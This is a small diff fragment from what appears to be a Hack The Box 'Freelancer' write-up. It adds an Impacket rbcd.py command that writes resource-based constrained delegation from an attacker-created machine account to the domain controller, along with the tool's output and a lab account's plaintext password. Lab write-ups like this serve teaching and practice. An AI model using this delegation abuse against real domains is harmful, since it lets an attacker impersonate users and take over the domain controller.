@@ -713,6 +713,19 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 As seen here the attribute is empty
 
 ```python
+rbcd.py -delegate-from "EVIL$" -delegate-to "DC$" -dc-ip 10.129.66.164 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'             
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] EVIL$ can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     EVIL$        (S-1-5-21-3542429192-2036945976-3483670807-12101)
+```
+
+Ill configure the delegation with my new machine account i made
+
+```python
 
 ```
 
